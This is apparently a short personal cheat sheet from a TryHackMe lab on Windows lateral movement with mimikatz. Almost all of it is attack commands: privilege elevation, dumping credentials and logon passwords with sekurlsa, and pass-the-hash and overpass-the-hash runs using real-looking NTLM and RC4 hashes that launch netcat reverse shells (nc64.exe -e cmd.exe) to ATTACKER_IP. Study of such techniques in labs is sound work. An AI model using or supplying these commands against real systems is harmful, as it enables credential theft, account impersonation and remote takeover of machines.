#active  #windows
pass the hash

```
privilege::debug
token::elevate
sekurlsa::msv
```

```shell-session
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

over paas the hash

```
privilege::debug
token::elevate
sekurlsa::ekeys
```


```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```


```
privilege::debug
token::elevate
sekurlsa::logonpasswords
```
`To get all the creds from current logins`

